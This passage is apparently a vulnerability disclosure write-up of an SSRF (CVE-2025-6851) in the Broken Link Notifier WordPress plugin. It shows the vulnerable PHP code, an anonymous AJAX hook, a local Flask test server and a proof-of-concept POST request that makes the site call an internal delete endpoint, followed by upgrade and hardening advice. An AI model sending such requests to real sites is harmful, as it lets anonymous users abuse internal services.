    <div class="admonition-content">This function only sends a request to the URL and returns the URL status, it does not retrieve or return the file content. The SSRF issue arises when an attacker provides a URL pointing to internal services — the server will perform the request on behalf of the attacker, which can cause actions such as modifying data, deleting data, scanning/internal port checking, or calling sensitive endpoints. The function does not allow reading the returned file body directly, but performing requests to internal services alone can be harmful.</div>
  </div>
</div>
<p><code>check_url_status_code()</code> is called inside <code>check_link()</code></p>
<div class="highlight" title="helpers.php - v1.3.0"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="hl"><span class="lnt"> 6
</span></span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="hl"><span class="lnt"> 9
</span></span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="hl"><span class="lnt">13
</span></span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="hl"><span class="lnt">29
</span></span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">check_link</span><span class="p">(</span> <span class="nv">$link</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Handle the filtered link if false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nv">$link</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line hl"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$link</span><span class="p">,</span> <span class="nx">home_url</span><span class="p">()</span> <span class="p">)</span> <span class="o">||</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$link</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$link</span><span class="p">,</span> <span class="s1">&#39;//&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// Check locally first
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">url_to_postid</span><span class="p">(</span> <span class="nv">$link</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// It may be redirected or an archive page, so let&#39;s check status anyway
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// return $this-&gt;check_url_status_code( $link );
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>            <span class="nv">$status</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check_url_status_code</span><span class="p">(</span> <span class="nv">$link</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$CACHE</span><span class="o">-&gt;</span><span class="na">set_cached_link</span><span class="p">(</span> <span class="nv">$status</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Otherwise
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Skip url schemes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_url_schemes</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$scheme</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$link</span><span class="p">,</span> <span class="nv">$scheme</span><span class="o">.</span><span class="s1">&#39;:&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$status</span><span class="p">[</span> <span class="s1">&#39;text&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;Skipping: Non-Http URL Schema&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Return the status
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// return $this-&gt;check_url_status_code( $link );
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>        <span class="nv">$status</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check_url_status_code</span><span class="p">(</span> <span class="nv">$link</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$CACHE</span><span class="o">-&gt;</span><span class="na">set_cached_link</span><span class="p">(</span> <span class="nv">$status</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Return the good status
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="c1">// End check_link()
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>check_link()</code> validates the URL before calling <code>check_url_status_code()</code>. If the link is internal but doesn&rsquo;t point to a valid post (<code>elseif</code>), or is an external link (<code>else</code>), the function will call <code>check_url_status_code()</code> to obtain the status (<code>good</code>, <code>warning</code>, <code>broken</code>) and cache it. Empty, invalid, or unsupported-scheme links are skipped and no request is sent.</p>
<p><code>check_link()</code> is called inside <code>ajax_blinks()</code></p>
<div class="highlight" title="results.php - v1.3.0"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="hl"><span class="lnt"> 8
</span></span><span class="hl"><span class="lnt"> 9
</span></span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="hl"><span class="lnt">14
</span></span><span class="lnt">15
</span><span class="lnt">16
</span><span class="hl"><span class="lnt">17
</span></span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="hl"><span class="lnt">22
</span></span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="hl"><span class="lnt">26
</span></span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">ajax_blinks</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Verify nonce
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;nonce&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">wp_verify_nonce</span><span class="p">(</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nx">wp_unslash</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;nonce&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">nonce_blinks</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span> <span class="s1">&#39;No naughty business please.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Get the ID
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$source_url</span>    <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;source_url&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">filter_var</span><span class="p">(</span> <span class="nx">wp_unslash</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;source_url&#39;</span> <span class="p">]</span> <span class="p">),</span> <span class="nx">FILTER_SANITIZE_URL</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$header_links</span>  <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;header_links&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">wp_unslash</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;header_links&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="p">[];</span> <span class="c1">// phpcs:ignore WordPress.Security.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Make sure we have a source URL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$source_url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Only allow webpages, not file:///, etc.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nx">str_starts_with</span><span class="p">(</span> <span class="nv">$source_url</span><span class="p">,</span> <span class="s1">&#39;http&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">            <span class="nx">wp_send_json_error</span><span class="p">(</span> <span class="s1">&#39;Invalid source: &#39;</span> <span class="o">.</span> <span class="nv">$source_url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Header links
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$header_links</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$header_links</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$header_link</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$count_links</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$header_link</span> <span class="o">=</span> <span class="nv">$HELPERS</span><span class="o">-&gt;</span><span class="na">sanitize_link</span><span class="p">(</span> <span class="nv">$header_link</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$status</span> <span class="o">=</span> <span class="nv">$HELPERS</span><span class="o">-&gt;</span><span class="na">check_link</span><span class="p">(</span> <span class="nv">$header_link</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="nx">in_array</span><span class="p">(</span> <span class="nv">$status</span><span class="p">[</span> <span class="s1">&#39;code&#39;</span> <span class="p">],</span> <span class="nv">$notify_status_codes</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$count_notify</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$notify</span><span class="p">[</span> <span class="s1">&#39;header&#39;</span> <span class="p">][]</span> <span class="o">=</span> <span class="nv">$status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$good_links</span><span class="p">[</span> <span class="s1">&#39;header&#39;</span> <span class="p">][]</span> <span class="o">=</span> <span class="nv">$status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="c1">// End ajax_blinks()
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>This function is registered as a callback for an action hook with the hook name <code>wp_ajax_nopriv_blnotifier_blinks</code> for <strong>anonymous users</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">private</span> <span class="nv">$ajax_key_blinks</span> <span class="o">=</span> <span class="s1">&#39;blnotifier_blinks&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">add_action</span><span class="p">(</span> <span class="s1">&#39;wp_ajax_nopriv_&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ajax_key_blinks</span><span class="p">,</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;ajax_blinks&#39;</span> <span class="p">]</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>It then performs the following:</p>
<ol>
<li>Check <code>nonce</code> to prevent CSRF</li>
</ol>
<div class="details admonition note open">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-pencil-alt" aria-hidden="true"></i>Note<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
  <div class="details-content">
    <div class="admonition-content"><p>Because this hook is intended for <strong>anonymous users</strong>, the <code>nonce</code> will also appear in the homepage source code.
<figure><a class="lightgallery" href="/posts/2025-10-28-cve-2025-6851/nonce.png" title="Nonce in the returned page source" data-thumbnail="/posts/2025-10-28-cve-2025-6851/nonce.png" data-sub-html="<h2>Nonce</h2><p>Nonce in the returned page source</p>"><img loading="lazy" src='/posts/2025-10-28-cve-2025-6851/nonce.png' alt="Nonce" height="439" width="1543"></a><figcaption class="image-caption">Nonce in the returned page source</figcaption>
  </figure></p>
</div>
  </div>
</div>
<ol start="2">
<li>
<p>Read data from the request</p>
<ul>
<li>Retrieve <code>source_url</code> and links from <code>header_links</code></li>
<li>Only accept <code>source_url</code> that starts with <code>http</code>.</li>
</ul>
</li>
<li>
<p>Iterate each <code>header_links</code> item and call <code>check_link()</code> to check status
<code>header_links</code> is passed as an array: <code>header_link[0]=http://example.com</code></p>
</li>
</ol>
<h3 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="diagram-container">
  <pre class="mermaid">
graph LR
A[Anonymous Client sends URL] --> B[ajax_blinks]
B --> C[check_link]
C --> D[check_url_status_code]
D --> E[wp_remote_get with user-supplied URL]
E --> F[Response from server]
</pre>
  <pre class="mermaid-dark">
graph LR
A[Anonymous Client sends URL] --> B[ajax_blinks]
B --> C[check_link]
C --> D[check_url_status_code]
D --> E[wp_remote_get with user-supplied URL]
E --> F[Response from server]
</pre>
  <pre class="mermaid-neutral">
graph LR
A[Anonymous Client sends URL] --> B[ajax_blinks]
B --> C[check_link]
C --> D[check_url_status_code]
D --> E[wp_remote_get with user-supplied URL]
E --> F[Response from server]
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph LR
A[Anonymous Client sends URL] --> B[ajax_blinks]
B --> C[check_link]
C --> D[check_url_status_code]
D --> E[wp_remote_get with user-supplied URL]
E --> F[Response from server]
</pre></template>
</div>
<h2 class="heading-element" id="exploit"><span>Exploit</span>
  <a href="#exploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="local-server"><span>Local Server</span>
  <a href="#local-server" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Create a simple local service using Python</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BASE_DIR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/delete&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_id</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;No id provided&#34;</span><span class="p">,</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;delete it: </span><span class="si">{</span><span class="n">file_id</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Delete it: </span><span class="si">{</span><span class="n">file_id</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8001</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ol>
<li>
<p>Visit the homepage and obtain the <code>nonce</code></p>
</li>
<li>
<p>Send a POST request to the endpoint</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-admin/admin-ajax.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">action=blnotifier_blinks&amp;nonce=87f4d1ef16&amp;source_url=http://localhost:8001/&amp;header_links[0]=http://127.0.0.1:8001/delete?id=1</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Result</strong>:</p>
<p><figure><a class="lightgallery" href="/posts/2025-10-28-cve-2025-6851/result.png" title="Successfully sent request to local service" data-thumbnail="/posts/2025-10-28-cve-2025-6851/result.png" data-sub-html="<h2>Result</h2><p>Successfully sent request to local service</p>"><img loading="lazy" src='/posts/2025-10-28-cve-2025-6851/result.png' alt="Result" height="269" width="966"></a><figcaption class="image-caption">Successfully sent request to local service</figcaption>
  </figure></p>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Broken Link Notifier versions <strong>≤1.3.0</strong> are vulnerable to <strong>SSRF</strong>: the endpoint allows anonymous users to supply URLs, which leads to <code>wp_remote_get()</code> being called against internal services. Version <strong>1.3.1</strong> added DNS/IP checks and restrictions, preventing SSRF before the request is performed.</p>
<h2 class="heading-element" id="key-takeaways"><span>Key takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Upgrade immediately</strong> to <strong>≥1.3.1</strong>.</li>
<li><strong>Do not trust client-provided URLs</strong> — validate/allowlist before fetching.</li>
<li><strong>Block internal IPs</strong> (resolve DNS, block private/reserved ranges).</li>
<li><strong>Restrict endpoint privileges</strong> (do not allow anonymous).</li>
<li><strong>Return status instead of raw body</strong> when content is not needed.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
